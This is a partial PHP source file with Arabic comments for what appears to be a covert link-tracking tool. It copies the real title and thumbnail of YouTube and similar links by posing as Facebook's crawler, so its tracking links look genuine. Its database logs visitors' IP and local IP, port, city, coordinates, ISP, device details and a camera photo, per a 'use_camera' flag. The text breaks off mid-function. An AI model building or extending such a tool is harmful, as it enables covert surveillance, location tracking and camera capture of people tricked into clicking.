<?php
// ضبط المنطقة الزمنية للجزائر بدقة
date_default_timezone_set('Africa/Algiers');

// إظهار الأخطاء للتحقق والتأكد من العمل
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // إنشاء الجداول مع إضافة حقول غلاف الفيديو والعنوان الأصلي
    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        use_camera INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        country TEXT, 
        city TEXT, 
        lat TEXT, 
        lon TEXT, 
        isp TEXT, 
        device_info TEXT, 
        screen_res TEXT, 
        timezone TEXT, 
        photo TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("خطأ في قاعدة البيانات: " . $e->getMessage());
}

// دالة ذكية لسحب العنوان وصورة الغلاف الأصلية من أي رابط (يوتيوب، إنستغرام، إلخ)
function fetch_meta_details($url) {$title = ""; // تم حذف عبارة "شاهد الفيديو المباشر"
    $image = "";

    // إذا كان الرابط من يوتيوب، نستخرج صورة الغلاف والعنوان بدقة
    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
        $video_id =$matches[1];
        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
    }

    // محاولة قراءة العنوان والغلاف من الصفحة الأصلية
    $options = [
        'http' => [
            'method' => "GET",
            'header' => "User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)\r\n"
        ]
    ];
    $context = stream_context_create($options);$html = @file_get_contents($url, false,$context);

    if ($html) {
        // استخراج عنوان الفيديو الأصلي فقط
        if (preg_match('/<property="og:title"\s+content="([^"]+)"/i', $html,$m) || preg_match('/<title>(.*?)<\/title>/i', $html,$m)) {
            $title = html_entity_decode($m[1], ENT_QUOTES, 'UTF-8');
            // تنظيف العنوان من اسم منصة يوتيوب إذا وجد
            $title = str_replace(' - YouTube', '',$title);
        }
        // استخراج الصورة في حال لم تكن يوتيوب
        if (
